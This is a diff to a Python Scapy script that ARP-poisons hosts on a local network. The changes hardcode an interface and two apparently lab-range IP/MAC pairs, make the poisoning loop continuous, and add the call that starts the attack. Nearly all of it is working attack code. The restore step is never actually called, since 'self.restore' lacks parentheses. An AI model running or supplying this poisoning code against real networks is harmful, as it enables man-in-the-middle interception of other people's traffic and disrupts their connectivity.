@@ -13,6 +13,11 @@ import scan
 # else
 # os.system("sysctl -w net.ipv4.ip_forward=0")
 
+interface = 'enp0s3'
+hosts = [["192.168.56.101", "08:00:27:b7:c4:af"], 
+        ["192.168.56.102", "08:00:27:cc:08:6f"]]
+interval = 2
+
 class Poison:
 
     interface = ' '
@@ -28,7 +33,7 @@ class Poison:
 
     def poison(self):
         print("Arp poisoning selected hosts with given arguments")
-        print("Press any key to terminate the attack")
+        print("Press ctrl-c or del to terminate the attack")
 
         def sendPoison(srcIP, dstIP, dstMAC):
             arp = Ether() / ARP()
@@ -41,11 +46,12 @@ class Poison:
             sendp(arp, iface=self.interface)
 
         try:
-            for host1 in self.hosts:
-                for host2 in self.hosts:
-                    if host1 != host2:
-                        sendPoison(host1[0], host2[0], host2[1])
-            sleep(self.interval)
+            while True:
+                for host1 in self.hosts:
+                    for host2 in self.hosts:
+                        if host1 != host2:
+                            sendPoison(host1[0], host2[0], host2[1])
+                sleep(self.interval)
         except KeyboardInterrupt:
             self.restore
 
@@ -61,7 +67,7 @@ class Poison:
             arp[ARP].pdst = dstIP
 
             sendp(arp, iface=self.interface)
-
+        
         for host1 in self.hosts:
             for host2 in self.hosts:
                 if host1 != host2:
@@ -70,3 +76,4 @@ class Poison:
 
 if __name__ == '__main__':
     arp = Poison(interface, hosts, interval)
+    arp.poison()
